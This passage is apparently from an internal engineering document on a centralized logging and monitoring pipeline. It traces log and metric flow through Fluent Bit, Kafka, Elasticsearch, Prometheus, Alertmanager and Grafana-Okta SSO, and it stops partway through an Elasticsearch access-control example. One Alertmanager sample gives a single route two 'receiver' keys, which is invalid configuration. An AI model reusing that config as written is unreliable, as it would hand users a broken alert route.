# Centralized Logging and Monitoring Pipeline: Internal Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Document  
> **Audience:** Engineers, Security Reviewers, SREs, Interview Candidates  
> **Scope:** Full-stack centralized logging and monitoring system — ingestion, transport, storage, querying, alerting, and security  
> **Version:** 1.0

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios (Very Detailed)](#9-attack-scenarios-very-detailed)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability (Observing the Observer)](#12-observability-observing-the-observer)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

A logging and monitoring pipeline has two distinct user classes with fundamentally different journeys: **producers** (services emitting logs/metrics) and **consumers** (engineers querying dashboards, receiving alerts). This section traces both, plus the lifecycle of a critical alert from event to human response.

### 1.1 Producer Journey: A Microservice Emitting a Log Line

**T=0ms — Application code reaches a log statement**

An order service processes a payment failure. The code executes:

```python
logger.error("Payment failed", extra={
    "order_id": "ord-8823",
    "user_id": "usr-4491",
    "amount": 99.99,
    "error_code": "CARD_DECLINED",
    "trace_id": "4bf92f3577b34da6"
})
```

What the developer thinks happens: "this logs something somewhere."

What actually happens, in order:

1. The logging library (Python `structlog`, or `logrus` in Go, or `log4j2` in Java) serializes the call into a structured log event. It enriches the event with: current timestamp (microsecond precision via `clock_gettime(CLOCK_REALTIME)`), log level, logger name, thread ID, process ID, hostname, and any globally-configured fields (service name, version, environment, Kubernetes pod name, namespace).

2. The enriched event is serialized to JSON (or logfmt, or OTLP — depending on configuration). For JSON:
   ```json
   {
     "timestamp": "2024-01-15T14:32:01.123456Z",
     "level": "error",
     "service": "order-service",
     "version": "2.3.1",
     "env": "production",
     "pod": "order-service-7d8f9b-xk2p4",
     "node": "ip-10-0-1-45.ec2.internal",
     "trace_id": "4bf92f3577b34da6",
     "span_id": "00f067aa0ba902b7",
     "message": "Payment failed",
     "order_id": "ord-8823",
     "user_id": "usr-4491",
     "amount": 99.99,
     "error_code": "CARD_DECLINED"
   }
   ```

3. The serialized event is written to the logging library's internal buffer (in-memory ring buffer). It is NOT yet written to disk or network. This is by design — writing to stdout/stderr is synchronous and would block the application's hot path.

4. A background thread flushes the buffer. Depending on the library configuration:
   - **Sync mode:** flush on every write (lowest throughput, highest durability)
   - **Async mode:** flush every 100ms or when buffer reaches 4MB (highest throughput, risk of losing last N logs on crash)
   - **Best of both worlds:** flush every 100ms AND on SIGTERM (graceful shutdown flushes the buffer)

5. The background thread writes to `stdout` (or stderr for errors). In containerized environments (Docker/Kubernetes), `stdout` is captured by the container runtime (containerd, Docker daemon) which writes it to a log file at `/var/log/containers/{pod}_{namespace}_{container}-{hash}.log`.

**T+1ms — Log collector picks up the line**

6. A log collector agent (Fluent Bit, Filebeat, Vector, or the Kubernetes logging agent) runs on every node as a DaemonSet. It watches `/var/log/containers/` using Linux's `inotify` API. When the container runtime appends to the log file, `inotify` fires an `IN_MODIFY` event. The agent wakes up, reads the new data, and adds it to its processing pipeline.

7. The agent parses the raw line (already JSON in our case), applies transformations (add Kubernetes metadata: pod labels, namespace, cluster name), and buffers internally.

8. The agent opens a TCP connection to the central log ingestion endpoint (if not already open — connections are kept alive and reused). It ships the batch of log events via HTTP/2+TLS or gRPC+TLS to the ingestion service.

**T+50ms — Ingestion service receives the event**

9. The ingestion service (a Kafka producer, or Logstash, or a custom service) receives the batch. It validates the schema, applies additional enrichment (GeoIP lookup for external IPs, threat intelligence tagging), and produces the events to a Kafka topic.

10. Kafka persists the event to disk (via the leader broker, replicated to 2 follower brokers). The producer receives acknowledgement. The event is now durable — it will survive any single broker failure.

**T+200ms — Storage consumers index the event**

11. Multiple Kafka consumer groups independently consume the topic:
    - **Elasticsearch consumer:** indexes the event into Elasticsearch for full-text search and dashboards
    - **Cold storage consumer:** batches events and writes to S3/GCS as compressed Parquet files for long-term retention
    - **Alert evaluation consumer:** streams events through alert rules and fires notifications

12. After Elasticsearch indexing (typically 1–2 seconds total, due to refresh interval), the event is queryable.

### 1.2 Consumer Journey: Engineer Opens a Dashboard

**T=0 — Engineer opens Grafana at `https://grafana.internal.example.com`**

1. Browser resolves the internal DNS name (via internal DNS resolver, which knows about `internal.example.com` zone).
2. TLS handshake with Grafana's certificate (signed by internal CA, trusted by corporate devices via MDM-pushed root CA).
3. Browser loads Grafana UI. Grafana checks for an existing session (cookie). If none: redirects to SSO (Okta/Google). Engineer authenticates via MFA.
4. Grafana loads the default dashboard. Dashboard panels make HTTP requests to the Grafana backend, which proxies queries to Prometheus (for metrics) and Elasticsearch (for logs).
5. Grafana renders the time-series panels (CPU, memory, error rates, latency P99s) using data returned from Prometheus.

### 1.3 Alert Journey: A Critical Event Triggers a Page

**T=0ms — An alert rule fires**

1. Prometheus evaluates its alert rules every 15 seconds (configurable `evaluation_interval`). A rule fires when a PromQL expression is true for a configured duration:
   ```
   ALERT HighErrorRate
   IF rate(http_requests_total{status=~"5.."}[5m]) / rate(http_requests_total[5m]) > 0.05
   FOR 2m
   LABELS { severity="critical" }
   ANNOTATIONS { summary="Error rate > 5% for 2m on {{ $labels.service }}" }
   ```

2. The alert enters the `PENDING` state (the condition is true but has not been true for the full `FOR 2m` duration). This prevents alert storms from transient spikes.

3. At T+2m, if the condition is still true, the alert transitions to `FIRING`. Prometheus sends the alert to **Alertmanager** via a POST request.

4. Alertmanager receives the alert, applies routing rules (which team owns this service?), grouping (don't page 50 times for 50 pods — group by service), and deduplication (if this alert already fired 5 minutes ago and is still active, don't re-page).

5. Alertmanager routes the alert to the appropriate channel:
   - PagerDuty → on-call engineer's phone (call + SMS within 30 seconds)
   - Slack channel `#incidents-prod`
   - Email to the team's distribution list

6. **What the engineer sees:** PagerDuty app notification on phone, Slack message with alert details, a link to the runbook, and a link to the Grafana dashboard pre-scoped to the affected service and time window.

7. **What the engineer does:** Acknowledges the alert (stops escalation), opens the Grafana link, looks at logs in Kibana for the affected service in the time window, identifies the root cause, resolves.

---

## 2. Network Layer Flow

### 2.1 DNS Resolution for Internal Services

Internal services use private DNS zones. The DNS resolution path differs significantly from public internet:

```
Service Pod (10.0.1.45)          kube-dns (CoreDNS, 10.96.0.10)    Internal DNS (10.0.0.2)
       |                                   |                                  |
       |-- query: logstash.logging.svc --> |                                  |
       |   .cluster.local (A record?)      |                                  |
       |                                   |-- check cluster DNS zone ------  |
       |                                   |   match: logstash.logging.svc   |
       |                                   |   .cluster.local = 10.96.4.23   |
       |<-- 10.96.4.23 (ClusterIP) ------  |                                  |
       |                                   |                                  |
       |-- query: grafana.internal.ex... ->|                                  |
       |                                   |-- no match in cluster zone ---> |
       |                                   |-- forward to internal DNS ---->  |
       |                                   |                         |        |
       |                                   |                         |-- A: 10.0.8.15
       |                                   |<-- 10.0.8.15 ----------|        |
       |<-- 10.0.8.15 -------------------- |                                  |
```

**Kubernetes DNS specifics:**

Every Kubernetes service gets a DNS name in the format: `{service}.{namespace}.svc.cluster.local`. CoreDNS serves this zone. Pods have `/etc/resolv.conf` configured by Kubernetes to search the cluster-local domain first:

```
nameserver 10.96.0.10   # CoreDNS ClusterIP
search logging.svc.cluster.local svc.cluster.local cluster.local
options ndots:5
```

`ndots:5` means: if the query has fewer than 5 dots, try appending each search domain before trying the bare name as a global query. This causes `logstash.logging` to first try `logstash.logging.logging.svc.cluster.local`, then `logstash.logging.svc.cluster.local` (match!). It also means external queries like `api.example.com` (1 dot, < 5) will first try `api.example.com.logging.svc.cluster.local` (fail), then eventually try `api.example.com` (global query). This adds latency to external DNS resolution from pods — a known Kubernetes footgun.

### 2.2 Network Flow: Log Agent to Ingestion Service

```
Log Agent (Fluent Bit)            Load Balancer              Kafka REST Proxy / Logstash
  10.0.1.45:49123                 10.0.0.5:9200               10.96.4.23:9200
        |                               |                             |
        |-- TCP SYN ----------------->  |                             |
        |<-- TCP SYN-ACK -------------- |                             |
        |-- TCP ACK ----------------->  |                             |
        |                               |                             |
        |-- TLS ClientHello ----------> |   [LB terminates TLS here] |
        |<-- TLS ServerHello +Cert ---- |                             |
        |   [mutual TLS: agent also     |                             |
        |    sends its client cert]     |                             |
        |-- TLS Certificate ----------> |                             |
        |-- TLS Finished -------------> |                             |
        |<-- TLS Finished ------------- |                             |
        |                               |-- TCP SYN ----------------> |
        |                               |<-- SYN-ACK ---------------- |
        |                               |-- ACK -------------------> |
        |                               |-- TLS (internal) ---------> |
        |                               |                             |
        |-- HTTP/2 POST /logs ------->  |-- forward to backend ----> |
        |   [compressed batch]          |                             |
        |<-- 204 No Content ----------- |<-- 204 No Content --------- |
```

**Why mTLS for log agents?**

Log agents run on every node in your infrastructure. They have access to all logs from all services on that node. If an attacker compromises a node and runs a rogue process that impersonates a log agent, they could:
- Inject fabricated log events into the pipeline (poisoning your audit trail)
- Forge security events to hide malicious activity

mTLS solves this: the ingestion service validates the client certificate. Only agents with a certificate signed by the internal CA are accepted. Certificates are issued per-node and rotated periodically (e.g., using Cert-Manager + Vault).

### 2.3 TCP and TLS Details for the Monitoring Stack

**Prometheus scraping (pull model):**

```
Prometheus Server                   Target Service (order-service)
  10.0.2.10                          10.0.1.45:8080
       |                                   |
       |-- TCP SYN to :8080/metrics -----> |  [every 15s]
       |<-- SYN-ACK ---------------------- |
       |-- ACK ---------------------------> |
       |-- GET /metrics HTTP/1.1 --------> |  [or HTTP/2 if configured]
       |   Host: 10.0.1.45:8080           |
       |   Accept: text/plain;0.0.4        |
       |   X-Prometheus-Scrape-Timeout: 10s|
       |<-- 200 OK ----------------------- |
       |   Content-Type: text/plain;0.0.4  |
       |   [Prometheus exposition format]  |
       |-- TCP FIN -AP --------------------> | [connection closed after each scrape]
```

Prometheus uses a **pull model**: it actively fetches metrics from targets. This is the opposite of push (where services send metrics to a collector). Pull advantages: Prometheus controls the scrape rate; a crashed service stops being scraped (you see missing data rather than stale data); no need for services to know the collector's address.

Pull disadvantages: Prometheus must reach every target directly; doesn't work well across network boundaries (firewalls, multiple regions); not suitable for batch jobs (they finish before being scraped). Solution for batch jobs: **Pushgateway** — a stateful proxy where jobs push metrics, Prometheus scrapes the Pushgateway.

### 2.4 TLS Certificate Architecture for the Monitoring Stack

```
Internal Root CA (offline, HSM-backed)
        │
        ├── Intermediate CA: "Monitoring Infra CA"
        │         │
        │         ├── Server cert: logstash.logging.svc.cluster.local
        │         ├── Server cert: kafka.kafka.svc.cluster.local
        │         ├── Server cert: elasticsearch.logging.svc.cluster.local
        │         ├── Server cert: grafana.internal.example.com
        │         ├── Server cert: prometheus.internal.example.com
        │         │
        │         └── Client certs (mTLS):
        │               ├── fluent-bit-node-ip-10-0-1-45 (rotated every 30 days)
        │               ├── fluent-bit-node-ip-10-0-1-46
        │               └── ... (one per node)
        │
        └── Intermediate CA: "Application Services CA"
                  │
                  └── Server certs for application services
```

**Certificate rotation:** Cert-Manager (in Kubernetes) watches certificate expiry dates. 30 days before expiry, it automatically generates a new CSR, sends it to Vault PKI, receives the new certificate, and updates the Kubernetes Secret holding the certificate. Fluent Bit detects the Secret update (via Kubernetes watch) and performs a graceful reload, loading the new certificate without dropping the TCP connection.

### 2.5 Where Latency and Failure Occur

```
Stage                         Typical Latency    P99 Latency    Failure Mode
─────────────────────────────────────────────────────────────────────────────
App → stdout (write)          < 0.1ms            0.5ms          Buffer full (backpressure)
stdout → container log file   < 1ms              5ms            Disk full on node
inotify notification          < 1ms              10ms           inotify watch limit hit
Fluent Bit internal buffer    0ms (in memory)    -              OOM, crash
Fluent Bit → Kafka/Logstash   1–5ms (LAN)        50ms           Network partition, auth fail
Kafka replication             2–10ms             50ms           Broker failure, ISR shrink
Elasticsearch indexing        100–500ms          2000ms         Heap pressure, shard issues
Prometheus scrape             1–10ms             100ms          Target unreachable, timeout
Prometheus → Alertmanager     < 1ms (HTTP POST)  10ms           Alertmanager down
Alertmanager → PagerDuty      100–500ms (HTTPS)  5000ms         PD API down, rate limit
```

---

## 3. Application Layer Flow

### 3.1 Log Ingestion HTTP Lifecycle (Fluent Bit → Logstash)

**Request (Fluent Bit → Logstash Beats input):**

```
POST /_bulk HTTP/1.1
Host: logstash.logging.svc.cluster.local:5044
Content-Type: application/x-ndjson
Content-Encoding: gzip
Authorization: Bearer eyJhbGci...   (or mTLS cert instead)
X-Request-ID: 8f3a1b2c-4d5e-6f7a-8b9c-0d1e2f3a4b5c
Content-Length: 4821

[gzip-compressed NDJSON body]
After decompression:
{"index":{"_index":"logs-production-2024.01.15"}}
{"timestamp":"2024-01-15T14:32:01.123456Z","level":"error","service":"order-service",...}
{"index":{"_index":"logs-production-2024.01.15"}}
{"timestamp":"2024-01-15T14:32:01.124000Z","level":"info","service":"order-service",...}
... (up to 500 events per batch)
```

**Server-side processing pipeline in Logstash:**

```
Input plugin (Beats/HTTP) receives request
        │
        ▼
Codec: JSON lines decoder
  - Decompress gzip
  - Parse each NDJSON line as JSON
  - Reject malformed JSON (send 400, don't crash)
        │
        ▼
Filter pipeline (sequential, per event):
  1. mutate: rename fields (legacy compatibility)
  2. geoip: lookup IP addresses → add lat/lon, city, country
  3. useragent: parse User-Agent string → browser, OS, device
  4. fingerprint: compute SHA-256 of event → deduplication ID
  5. ruby: custom business logic (sanitize PII fields)
  6. if [level] == "error" { tag: "alert_candidate" }
  7. date: parse @timestamp field, set as event timestamp
        │
        ▼
Output plugins (run in parallel):
  → Elasticsearch (primary storage, indexed)
  → Kafka (for other consumers: cold storage, alerting)
  → Dead Letter Queue (for events that fail all outputs)
```

**Response:**

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "took": 23,
  "errors": false,
  "items": [
    { "index": { "_id": "sha256-of-event", "result": "created", "status": 201 } },
    { "index": { "_id": "sha256-of-event2", "result": "created", "status": 201 } }
  ]
}
```

If any item fails (e.g., mapping conflict), `"errors": true` and the specific item shows the error. The agent can retry only failed items.

### 3.2 Prometheus Metrics Exposition Format

Prometheus uses a plain-text format (not JSON) for performance:

```
# HELP http_requests_total The total number of HTTP requests.
# TYPE http_requests_total counter
http_requests_total{method="GET",status="200",service="order-service"} 8923 1705328601123
http_requests_total{method="POST",status="200",service="order-service"} 3421 1705328601123
http_requests_total{method="POST",status="500",service="order-service"} 12 1705328601123
# HELP http_request_duration_seconds HTTP request duration in seconds.
# TYPE http_request_duration_seconds histogram
http_request_duration_seconds_bucket{le="0.01"} 4329
http_request_duration_seconds_bucket{le="0.05"} 7821
http_request_duration_seconds_bucket{le="0.1"} 8700
http_request_duration_seconds_bucket{le="0.5"} 8910
http_request_duration_seconds_bucket{le="1.0"} 8921
http_request_duration_seconds_bucket{le="+Inf"} 8923
http_request_duration_seconds_sum 142.3
http_request_duration_seconds_count 8923
```

**What each type means:**

- **Counter:** Monotonically increasing. Always use `rate()` or `increase()` in PromQL — the raw value is useless. Counter resets (service restart) are handled automatically by `rate()` (Prometheus detects the reset and adjusts).
- **Gauge:** Point-in-time value. CPU usage, memory usage, queue depth. Can go up or down.
- **Histogram:** Samples observations into configurable buckets. Pre-aggregated on the client side. Efficient for calculating latency percentiles via `histogram_quantile()`. The trade-off: bucket boundaries must be configured upfront; wrong buckets lose precision.
- **Summary:** Like a histogram but percentiles are computed client-side. Cannot be aggregated across multiple instances (you cannot combine the P99 from 3 pods into a fleet-wide P99). Use histograms for distributed systems; summaries for single-process metrics where aggregation is not needed.

### 3.3 Grafana Query Lifecycle

When an engineer opens a Grafana dashboard panel, Grafana executes a query against the data source:

```
Browser → GET /api/dashboards/uid/abc123 (dashboard JSON)
Browser → POST /api/ds/query HTTP/1.1
          { "queries": [
              { "datasource": {"type":"prometheus","uid":"P1809F7CD0C75ACF3"},
                "expr": "rate(http_requests_total{status=~\"5..\",service=\"order-service\"}[5m])",
                "start": 1705325001,
                "end": 1705328601,
                "step": 15 }
            ] }

Grafana backend:
  → Validates user has read access to this datasource
  → Looks up datasource config (Prometheus URL, auth credentials)
  → Forwards query to Prometheus:
      GET /api/v1/query_range?query=rate(...)&start=1705325001&end=1705328601&step=15
      Authorization: Bearer {prometheus-datasource-token}
  → Receives Prometheus response (JSON with time-series data points)
  → Returns to browser

Browser:
  → Renders time-series chart using @grafana/ui components
```

**PromQL evaluation in Prometheus:**

The `rate(http_requests_total{...}[5m])` query:
1. Prometheus evaluates at each step (every 15 seconds in the range)
2. For each evaluation timestamp `t`, it looks back `5m` (300 seconds)
3. It finds all samples for `http_requests_total` matching the label selectors in `[t-300s, t]`
4. It performs linear regression on the counter values to compute the per-second rate
5. This extrapolates correctly at the edges (start/end of the window)

---

## 4. Backend Architecture

### 4.1 Complete System Architecture

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  PRODUCERS                                                                    │
│                                                                               │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐ │
│  │ App Services │  │  Databases  │  │   Infra     │  │   Batch Jobs        │ │
│  │ (logs/metrics│  │ (slow query,│  │(system logs,│  │ (completion metrics,│ │
│  │  /traces)    │  │  errors)    │  │  audit)     │  │  error logs)        │ │
│  └──────┬───────┘  └──────┬──────┘  └──────┬──────┘  └─────────┬───────────┘ │
│         │                 │                 │                   │             │
└─────────┼─────────────────┼─────────────────┼───────────────────┼─────────────┘
          │ stdout/file      │ syslog/file      │ syslog            │ push
          ▼                 ▼                 ▼                   ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  COLLECTION LAYER                                                            │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │  Fluent Bit DaemonSet (one per node) — Logs                           │ │
│  │  • Tail /var/log/containers/* (inotify)                               │ │
│  │  • Parse JSON, add K8s metadata                                       │ │
│  │  • Buffer in memory + optional disk buffer (tail plugin)              │ │
│  │  • Ship via HTTP/2+mTLS to Kafka or Logstash                          │ │
│  └────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │  Prometheus Node Exporter DaemonSet — System metrics                  │ │
│  │  • Exposes /metrics (CPU, mem, disk, net stats from /proc, /sys)      │ │
│  └────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │  OpenTelemetry Collector DaemonSet — Traces + OTLP metrics            │ │
│  │  • Receives OTLP (gRPC port 4317, HTTP port 4318)                     │ │
│  │  • Batches, compresses, exports to Jaeger/Tempo                       │ │
│  └────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │  Pushgateway — Batch job metrics                                       │ │
│  │  • Stateful: holds metrics until scraped or TTL expires               │ │
│  └────────────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────┬────────────────────────────────┘
                                             │
                                             ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  TRANSPORT / BUFFER LAYER                                                    │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │  Apache Kafka Cluster (3+ brokers, replication factor 3)              │ │
│  │  Topics:                                                               │ │
│  │  • logs.production (64 partitions, retention 7 days, 3TB)             │ │
│  │  • logs.staging (16 partitions, retention 3 days)                     │ │
│  │  • metrics.raw (32 partitions, retention 24h)                         │ │
│  │  • traces.raw (16 partitions, retention 24h)                          │ │
│  │  • alerts.events (8 partitions, retention 30 days)                    │ │
│  └────────────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────┬────────────────────────────────┘
                                             │
                          ┌──────────────────┼──────────────────┐
                          │                  │                  │
                          ▼                  ▼                  ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  STORAGE LAYER                                                               │
│                                                                              │
│  ┌──────────────────┐  ┌──────────────────┐  ┌────────────────────────────┐ │
│  │  Elasticsearch   │  │  Prometheus TSDB │  │  Cold Storage (S3/GCS)    │ │
│  │  Cluster         │  │  + Thanos/Cortex │  │  Parquet files, compressed│ │
│  │  (logs, search)  │  │  (metrics, long- │  │  Athena/BigQuery for adhoc│ │
│  │  7-day hot tier  │  │  term retention) │  │  queries on old data      │ │
│  │  90-day warm tier│  │  15s resolution  │  │  1-year+ retention        │ │
│  └──────────────────┘  └──────────────────┘  └────────────────────────────┘ │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │  Jaeger / Grafana Tempo (distributed traces)                           │ │
│  │  Cassandra or object storage backend                                   │ │
│  └────────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────────┘
                                             │
                                             ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  QUERY / ALERTING LAYER                                                      │
│                                                                              │
│  ┌──────────────────┐  ┌──────────────────┐  ┌────────────────────────────┐ │
│  │  Grafana          │  │  Alertmanager     │  │  Kibana                   │ │
│  │  (dashboards,     │  │  (routing,        │  │  (log search, discovery)  │ │
│  │  alerts, explore) │  │  grouping, dedup) │  │                           │ │
│  └──────────────────┘  └──────────────────┘  └────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 4.2 Kafka: The Central Nervous System

Kafka is the backbone of the logging pipeline. Understanding it deeply is essential.

**Kafka data model:**
- **Topic:** A named, append-only, ordered log of events. Not a queue — consumers do not "consume" (remove) messages. They maintain a pointer (offset) into the log.
- **Partition:** Each topic is split into N partitions. Each partition is an ordered log. Events in the same partition are strictly ordered. Events across partitions have no ordering guarantee.
- **Offset:** A monotonically increasing integer for each event within a partition. Consumer tracks its offset = "I have processed everything up to offset 4,592 in partition 3."
- **Consumer group:** Multiple consumer instances sharing a group ID. Kafka assigns each partition to exactly one consumer in the group. Adding consumers scales read throughput (more partitions → more consumers).
- **Replication:** Each partition has one leader (handles reads and writes) and N-1 followers (replicate from leader). If the leader fails, a follower is elected as the new leader. `replication.factor=3` means 3 copies of every message.

**Kafka producer configuration for log agents:**

```yaml
# Critical settings for high-reliability log shipping:
acks: all              # Wait for all in-sync replicas to acknowledge
                       # (not just the leader). Slowest but guarantees no data loss
                       # if the leader crashes immediately after ack.
enable.idempotence: true  # Exactly-once semantics for the producer.
                           # Each message has a sequence number; broker deduplicates.
retries: 2147483647    # Retry forever (until delivery.timeout.ms)
delivery.timeout.ms: 120000  # 2 minutes total retry budget
linger.ms: 10          # Wait 10ms to accumulate messages before sending a batch
                       # (improves throughput at cost of 10ms latency)
batch.size: 65536      # 64KB batch size
compression.type: lz4  # LZ4 compression: fast (1–3ms overhead), good ratio (3–5x)
max.in.flight.requests.per.connection: 5  # 5 concurrent requests (with idempotence enabled)
```

**Why `acks=all` matters:** With `acks=1` (leader only), a message is acknowledged when the leader writes it to disk. If the leader crashes before replicating, the message is lost. The new leader does not have it. `acks=all` ensures all in-sync replicas (ISR) have the message before ack. If ISR has 3 replicas, all 3 must confirm before the producer gets an ack. This means you can lose 2 brokers without losing data.

### 4.3 Elasticsearch Index Design

Elasticsearch is the primary log search and storage engine. Index design is critical for performance.

**Index naming convention:** `logs-{environment}-{YYYY.MM.DD}` (e.g., `logs-production-2024.01.15`)

Daily indices allow:
- Deleting old data by deleting old indices (much faster than query-based deletion)
- Tiered storage: today's index on hot nodes (NVMe SSDs), last-week on warm nodes (SSDs), last-month on cold nodes (HDDs), older on frozen tier (S3)
- Rolling ILM (Index Lifecycle Management) policies automate transitions

**Mapping (schema) for log events:**

```json
{
  "mappings": {
    "dynamic": "strict",
    "properties": {
      "@timestamp":   { "type": "date" },
      "level":        { "type": "keyword" },
      "service":      { "type": "keyword" },
      "env":          { "type": "keyword" },
      "message":      { "type": "text", "analyzer": "standard" },
      "trace_id":     { "type": "keyword", "index": true },
      "span_id":      { "type": "keyword" },
      "user_id":      { "type": "keyword" },
      "order_id":     { "type": "keyword" },
      "error_code":   { "type": "keyword" },
      "duration_ms":  { "type": "float" },
      "host":         { "type": "keyword" },
      "pod":          { "type": "keyword" },
      "namespace":    { "type": "keyword" }
    }
  }
}
```

**`keyword` vs `text`:**
- `keyword`: Stored as-is, exact-match queries, aggregations, sorting. Used for IDs, enums, hostnames. Efficient — no analysis.
- `text`: Analyzed (tokenized, lowercased, stemmed). Enables full-text search (`match` query). Used for free-text fields like `message`. Cannot be used for exact aggregations.
- `dynamic: strict`: Reject documents with unknown fields. This prevents "mapping explosion" where thousands of unique field names from misconfigured services fill Elasticsearch's field cache and cause OOM.

### 4.4 Prometheus TSDB (Time Series Database)

Prometheus stores metrics in its own custom time-series database. Understanding the internals explains both performance characteristics and failure modes.

**Storage model:**

```
/prometheus/data/
  ├── chunks_head/        ← In-memory data for the last 2 hours (WAL-backed)
  │   └── 000001
  ├── 01HRXYZ.../         ← Immutable block (2+ hours of data, compacted)
  │   ├── chunks/
  │   │   └── 000001      ← Compressed time-series chunks (XOR encoding)
  │   ├── index           ← Inverted index: label=value → series IDs
  │   ├── meta.json       ← Block metadata (min/max time, stats)
  │   └── tombstones      ← Marks for deleted series
  └── wal/                ← Write-ahead log (crash recovery)
      ├── 00000000
      └── 00000001
```

**How Prometheus stores a sample:**
1. Sample arrives (from scrape): `{__name__="http_requests_total", method="GET", status="200"}` value=8923 at timestamp T
2. The label set is hashed to a series ID. The series ID maps to a chunk in memory.
3. The sample is compressed using XOR encoding (timestamps use delta-of-delta encoding, values use XOR with the previous value). Compression ratio is typically 1.37 bytes/sample vs 16 bytes/sample uncompressed.
4. The sample is written to the Write-Ahead Log (WAL) on disk — this ensures durability before acknowledgement.
5. When the in-memory head block accumulates 2 hours of data, it is flushed to disk as an immutable block.
6. Background compaction merges small blocks into larger ones, improving query performance.

**Cardinality: the #1 Prometheus problem**

Cardinality = number of unique time series. `http_requests_total{method, status, service, endpoint}` with 10 methods × 5 statuses × 100 services × 1000 endpoints = 5,000,000 series. Each series needs ~3KB of memory in the head block = 15GB just for this one metric.

High cardinality causes:
- OOM crashes on Prometheus
- Slow query evaluation (must scan millions of series)
- Large WAL that takes hours to replay on restart

Solution: Never put high-cardinality values in labels (user IDs, request IDs, UUIDs, IP addresses, full URLs). Aggregate in the application before exposure as a metric.

### 4.5 Alertmanager: Routing and Deduplication

Alertmanager receives alerts from Prometheus (and other sources) and routes them to the correct notification channels.

```yaml
# alertmanager.yml
global:
  resolve_timeout: 5m  # If an alert stops firing, wait 5m before sending "resolved"

route:
  receiver: 'default-slack'  # Catch-all
  group_by: ['alertname', 'service']  # Group alerts with same alertname + service
  group_wait: 30s      # Wait 30s before sending first notification (collect siblings)
  group_interval: 5m   # Min time between notifications for a group
  repeat_interval: 4h  # Re-notify if still firing after 4h
  
  routes:
    - match: { severity: critical }
      receiver: 'pagerduty-critical'
      group_wait: 0s    # Page immediately on critical
      
    - match: { severity: warning }
      receiver: 'slack-warnings'
      
    - match: { team: security }
      receiver: 'security-slack'
      receiver: 'security-email'
      continue: true    # Don't stop here — also route to default

inhibit_rules:
  # Don't alert on individual pod errors if the whole service is down
  - source_match: { alertname: 'ServiceDown', severity: 'critical' }
    target_match: { alertname: 'PodCrashLooping' }
    equal: ['service']
```

**Deduplication mechanics:** Alertmanager uses a fingerprint (hash of alert labels) to identify unique alerts. Two Prometheus instances can send the same alert (for HA setups); Alertmanager deduplicates them. If the same alert fires, recovers, and fires again within the repeat_interval, only one notification is sent.

---

## 5. Authentication & Authorization Flow

### 5.1 Authentication Architecture: Who Can Write, Who Can Read

The logging system has two fundamentally different authentication requirements:

**Write path (producers → ingestion):**
- High volume, automated, machine-to-machine
- mTLS with node/service identity certificates
- No human interaction; certificate rotation must be automatic
- Trust: only pre-approved infrastructure nodes can write logs

**Read path (engineers → query/dashboard):**
- Human users, SSO-integrated, MFA required
- Role-based access: security team sees all logs; developers see only their service's logs
- Audit trail: every query must be logged (who searched for what, when)

### 5.2 SSO Integration for Grafana/Kibana

```
Engineer Browser              Grafana                 Okta (IdP)
       |                         |                        |
       |-- GET /dashboard -----> |                        |
       |                         |-- 302 to Okta -------> |
       |-- GET /oauth/authorize->|                        |
       |<-- 302 to Okta ---------|                        |
       |--GET /sso/authorize?client_id=grafana --------> |
       |                                                  | [MFA prompt]
       |<-- 302 to grafana.internal/oauth/callback?code= |
       |-- GET /oauth/callback?code=AUTHCODE ----------> |
       |                         |                        |
       |                         |-- POST /oauth/token -> |
       |                         |   { code, client_secret, redirect_uri }
       |                         |<-- { access_token, id_token, refresh_token }
       |                         |   [JWT id_token contains: email, groups, name]
       |                         |                        |
       |                         | [Create Grafana session]
       |                         | [Map Okta groups to Grafana orgs/roles]
       |<-- 302 / Set-Cookie: grafana_session=... -------|
       |-- GET /dashboard (with session cookie) ------->  |
       |<-- Dashboard HTML ------------------------------- |
```

**Group-to-role mapping:**
```
Okta Group: engineering-backend  → Grafana Role: Viewer (all dashboards)
Okta Group: sre-team            → Grafana Role: Editor (can create dashboards)
Okta Group: platform-admins     → Grafana Role: Admin
Okta Group: security-team       → Grafana Role: Admin + Kibana: All indices
Okta Group: engineering-frontend → Grafana Role: Viewer (only frontend dashboards)
```

### 5.3 Elasticsearch Row-Level Security (Field/Index-Level Access Control)

Different teams should only see logs from their own services. Elasticsearch supports this via document-level security (DLS) and field-level security (FLS) in the X-Pack security plugin:

```json
// Role: order-team-readonly
{
  "indices": [
    {
      "names": ["logs-production-*"],
      "privileges": ["read"],
      "query": {
        "term": { "service": "order-service" }
      }
      // Only documents where service=order-service are visible
    }
  ],
  "field_security": {
    "grant": ["@timestamp", "level", "message", "trace_id", "order_id", "duration_ms"],
    "except": ["user_id", "email", "ip_address"]
